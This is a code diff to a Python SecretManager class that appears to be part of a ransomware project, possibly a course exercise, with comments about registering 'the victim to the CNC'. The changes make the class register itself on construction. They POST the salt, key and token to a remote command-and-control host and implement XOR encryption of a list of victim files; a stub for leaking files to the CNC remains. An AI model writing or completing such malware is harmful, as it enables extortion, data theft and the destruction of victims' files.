@@ -27,6 +27,7 @@ class SecretManager:
         self._salt = b''
         self._token = b''
         self._log = logging.getLogger(self.__class__.__name__)
+        self.setup()
 
     def do_derivation(self, salt: bytes, key: bytes) -> None:
         self._salt = salt
@@ -47,7 +48,7 @@ class SecretManager:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> int:
         # register the victim to the CNC
         secrets_json = {
                 "salt": self.bin_to_b64(salt),
@@ -58,13 +59,14 @@ class SecretManager:
         self._log.debug(secrets_json)
         # self._log.debug(headers)
         url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(token))
-        requests.post(url, json = secrets_json, headers=header)
-        return None
+        post_request = requests.post(url, json = secrets_json, headers=header)
+        return post_request.status_code
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
         self.create()
-        self.post_new(self._salt, self._key, self._token)
+        post_status_code = self.post_new(self._salt, self._key, self._token)
+        self._log.info("post_new request returned with code " + str(post_status_code))
         if not Path(self._path).exists():  
             Path(self._path).mkdir(parents=True, exist_ok=True)
         if Path(self._path + '/token.bin').exists():
@@ -95,9 +97,10 @@ class SecretManager:
         # Should return a string composed of hex symbole, regarding the token
         raise NotImplemented()
 
-    def xorfiles(self, files: List[str])->None:
+    def xorfiles(self, files: List[str]) -> None:
         # xor a list for file
-        raise NotImplemented()
+        [xorfile(file, self._key) for file in files]
+        return None
 
     def leak_files(self, files: List[str])->None:
         # send file, geniune path and token to the CNC
